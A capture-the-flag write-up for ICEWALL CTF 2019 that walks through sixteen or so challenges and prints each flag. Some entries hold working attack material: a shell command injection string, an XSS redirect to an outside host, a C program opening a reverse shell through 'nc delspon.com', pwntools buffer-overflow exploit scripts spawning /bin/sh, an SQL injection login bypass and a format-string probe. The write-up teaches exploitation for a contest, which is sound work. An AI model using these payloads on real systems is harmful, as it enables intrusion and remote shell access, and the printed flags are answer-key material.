# ICEWALL CTF 2019

## echo

keyword: command injection

```shell
➜  ~ nc icewall-ctf.kr 33335
enter your message : ";sh;#

id
uid=1000(echo) gid=1000(echo) groups=1000(echo)
cat /home/*/*flag*
ICTF{very easy command injection}
```

## XSS

keyword: blind XSS, cross site script

```
<script>location.href='http://delspon.com:9999/';</script>
```

```
Referer: http://localhost/archiver?url=http://localhost/admin?_id=admin&_pw=ICTF{it is a baby xss}
```

## vtable

keyword: heap buffer overflow

```python
from pwn import *
import sys

if len(sys.argv) == 1:
  p = process('./vtable');
else:
  p = remote('icewall-ctf.kr', 33336)
system = 0x400630

payload = 'a'*0x50
payload += p64(system)
p.sendlineafter(']\n', payload)
p.sendlineafter(']\n', '/bin/sh')


p.interactive()
```

```shell
➜  vtable python ex.py 1
[+] Opening connection to icewall-ctf.kr on port 33336: Done
[*] Switching to interactive mode
$ id
uid=1000(vtable) gid=1000(vtable) groups=1000(vtable)
$ cat /home/*/*flag*
ICTF{function pointer is very usefu!l}
```

## assignment

There are 2 points to attack, Makefile & C code. You can inject shell commands via them.

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
  system("nc delspon.com 9998 | /bin/bash | nc delspon.com 9999");
  return 0;
}
```

```
ICTF{Pr0f35s0rS_mAY6E_BeC0m3_@nGry}
```

## secureC

keyword: buffer overflow

```shell
➜  securec nc icewall-ctf.kr 33337
Enter the patched code in base64 format
I2luY2x1ZGUgPHN0ZGlvLmg+CgppbnQgbWFpbigpIHsKICBjaGFyIGJ1ZlsweDQwXTsKICBzY2FuZigiJTYzcyIsIGJ1Zik7CiAgcHV0cyhidWYpOwogIHJldHVybiAwOwp9
It's safe :)
ICTF{easy to prevent buffer overflow}
```

## unexploitable

keyword: stack buffer overflow 

```python
from pwn import *
p=remote('icewall-ctf.kr',33330)
system=0x8048390
binsh=0x804864c
p.sendline('a'*0x34+p32(system)+p32(0)+p32(binsh))
p.interactive()
```

```
ICTF{What...?How_did_you_exploit_it} 
```

## memo

keyword: stack buffer overflow

```
from pwn import *
p=remote('icewall-ctf.kr',33331)
p.sendline('1')
p.recv()
p.sendline('%d'%0x40)
p.recv()
p.sendline('a'*0x40)
p.recv()
p.sendline('2')
p.recv()
p.sendline('%d'%0x50)
p.recvuntil('a'*0x40)
p.recv(8)
leak=p.recv(8)
libc=(u64(leak))-0x7f38631d3b97+0x00007f38631b2000
oneshot=libc+0x4f322
p.sendline('1')
p.sendline('%d'%0x50)
p.send('a'*0x48+p64(oneshot))
p.interactive()
```

```
ICTF{check_buffer_size_is_so_important}
```

## Kakaotalk

keyword: extension, file

```shell
jjy@jjy-VirtualBox:~/lab$ file 9cdfa94ea9cbac9277e0d55a30d7bf6a39825140811fc88c824cfe5e7c8cff68

9cdfa94ea9cbac9277e0d55a30d7bf6a39825140811fc88c824cfe5e7c8cff68: PNG image data, 994 x 360, 8-bit/color RGBA, non-interlaced

```

change file extension to '.png'

```
ICTF{FILE_IS_AWESOME_COMMAND}
```

## trace

keyword: packet, html

Open the packet with a wire shark. Then fillter with http protocol.

```html
<!doctype html>
<html lang="ko">
	<head>
	<meta charset="utf-8">
		<title>This is top secret</title>
	</head>
	<body>
		<img src="http://icewall-ctf.kr/secret.png" alt="top_secret">
	</body>
</html>
```

If you connect to http://icewall-ctf.kr/secret.png, you can get the flag.

```
ICTF{YOU_ARE_GOD_OF_FORENSIC}
```

## login

keyword: sql injection

A sql injection vulnerability exists in the login form. 

```
id: any value
pw:' or 1 -- a
```

```
ICTF{bas1c_sql_1nj3ct10n}
```

## Other options

keyword: format string bug

A format string bug exists in the program.

```python
from pwn import *
p=remote('icewall-ctf.kr',33338)
p.sendline('%s')
p.interactive()
```

## Crypto 1

keyword: caesar cipher

```python
e = 'NHYK{HFJXFW_HNUMJW_NX_F_XMNKY_HNUMJW}'
for i in xrange(1,26):
  d = ''
  for c in e:
    if 'A' <= c <= 'Z':
      d += chr((ord(c)-65 - i) % 26 + 65)
    else:
      d += c
  if 'ICTF' in d:
    print d
```

```
ICTF{CAESAR_CIPHER_IS_A_SHIFT_CIPHER}
```

## Crypto 2

keyword: feistel cipher

Refer to this document https://en.wikipedia.org/wiki/Feistel_cipher

```python
def decrypt(d):
    l = (d >> 32) & 0xffffffff
    r = d & 0xffffffff
    for i in xrange(128):
        t = r
        r = l
        l = t ^ l ^ (l | 368)
    return l << 32 | r

if __name__ == '__main__':
    res = open('result.txt', 'r').read().split('\n')
    res = map(int, res)

    flag = ''
    for i in res:
        flag += ('%x'%decrypt(i)).decode('hex')
    print flag
```

```
ICTF{very_siMp1e_Feistel_CipHer}
```

## Java

keyword: java decompiler

Decompile the .class files in the challenge.

```python
p = [92, 86, 65, 83, 110, 65, 125, 112, 103, 112, 53, 116, 103, 112, 53, 120, 116, 123, 108, 53, 95, 116, 99, 116, 53, 113, 112, 118, 122, 120, 101, 124, 121, 112, 103, 102,104 ]
flag = ''

for i in p:
    flag += chr(i ^ 0x5 ^ 0x10)

print flag
```

```
ICTF{There are many Java decompilers}
```

## strings

keyword: strings

```shell
strings "./stringscmd.elf"
```

```
ICTF{the_command_strings_is_awesome}
```

## PowMod

keyword: brute force attack, reverse engineering

```python
from socket import *

results = [62242650, 94056225, 81063052, 58910982, 64487988]
prime = 99999989
def digits(n):
  a = []
  for i in xrange(4):
    a.insert(0,n%10)
    n /= 10
  return a
ans = ['0']*10
for i in xrange(0, 10000):
  w,x,y,z = digits(i)
  if pow(19235517 * w + 10 * x + 235131 * y, 92759187 * z,prime) == results[0]:
    ans[0] = '%04i'%i
  if pow(100 * w + 10 * x + y, 1000000 * z,prime) == results[1]:
    ans[1] = '%04i'%i
  if w + x == 2 and y + z == 5 and \
        pow(10 * w + y, 10 * x + z,prime) == results[2]:
    ans[2] = '%04i'%i
  if w + x + y + z == 30 and \
        pow(10 * x + y, 10 * w + 12947291 * z,prime) == results[3]:
    ans[3] = '%04i'%i
  if z == 0 and \
     pow(132000 * w + 201272 * x, 12959320 * y,prime) == results[4]:
    ans[4] = '%04i'%i
ans = ''.join(ans)[:20]

sock = socket(AF_INET, SOCK_STREAM)
sock.connect(('icewall-ctf.kr', 1008))
sock.recv(1024)
sock.send(ans+'\n')
flag = sock.recv(1024)
print flag
```

```
ICTF{A brute-force attack is powerful}
```


